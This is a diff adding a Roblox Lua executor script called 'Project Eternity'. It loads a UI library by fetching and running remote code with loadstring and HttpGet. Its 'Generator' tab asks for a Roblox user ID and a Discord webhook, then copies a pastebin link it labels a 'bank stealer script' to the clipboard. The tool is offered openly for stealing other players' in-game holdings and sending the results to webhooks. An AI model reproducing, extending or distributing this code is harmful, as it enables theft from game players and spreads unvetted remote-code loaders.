@@ -1,0 +1,30 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Project Eternity", "BloodTheme")
+
+-- Credits
+    local Credits = Window:NewTab("Credits")
+    local CreditsSection = Credits:NewSection("Credits")
+
+    CreditsSection:NewLabel("Full credits goes to Baired#3358")
+    CreditsSection:NewButton("Discord Server", "Copies link to the Discord Server", function()
+        setclipboard("https://discord.gg/6QRqHzqkBd")
+    toclipboard("https://discord.gg/6QRqHzqkBd")
+    end)
+
+-- Generator
+    local Generator = Window:NewTab("Generator")
+    local GeneratorSection = Generator:NewSection("Generator")
+
+    GeneratorSection:NewTextBox("userID", "Enter your roblox user ID", function(txt)
+        setclipboard(" ")
+    toclipboard(" ")
+    end)
+    GeneratorSection:NewTextBox("Webhook", "Enter your Discord server Webhook", function(txt)
+        setclipboard(" ")
+    toclipboard(" ")
+    end)
+
+    GeneratorSection:NewButton("Generate (will be copied to clipboard)", "Generates bank stealer script", function()
+        setclipboard("https://pastebin.com/Qxrr9z4S")
+    toclipboard("https://pastebin.com/Qxrr9z4S")
+    end)
